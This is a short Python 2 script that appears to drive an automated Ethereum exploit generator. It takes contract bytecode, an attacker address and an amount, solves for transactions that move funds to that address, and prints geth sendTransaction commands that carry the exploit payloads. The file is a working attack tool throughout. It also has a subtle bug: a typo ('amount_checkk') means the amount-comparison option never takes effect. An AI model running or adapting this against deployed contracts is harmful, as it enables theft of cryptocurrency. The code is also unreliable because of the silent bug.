#!/usr/bin/env python2.7
import sys
import logging
from binascii import unhexlify, hexlify
import ethereum

logging.basicConfig(level=logging.DEBUG)

if __name__=='__main__':
    if len(sys.argv)<4:
        print 'Usage: %s <code> <target-address> <amount>'%sys.argv[0]
        exit(-1)
    with open(sys.argv[1]) as infile:
        inbuffer = infile.read().rstrip()
    amount_check = '='
    amount = sys.argv[3].strip()
    if amount[0] in ('=','+','-'):
        amount_checkk = amount[0]
        amount = amount[1:]
    amount = int(amount)
    code = unhexlify(inbuffer)
    result = ethereum.trivial_call_exploit(code, int(sys.argv[2], 16), amount, amount_check)
    if result:
        call, constraints, model = result
        print call
        print "In geth, use:"
        for c in call:
            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"})'%(int(sys.argv[2], 16), hexlify(c['payload']))
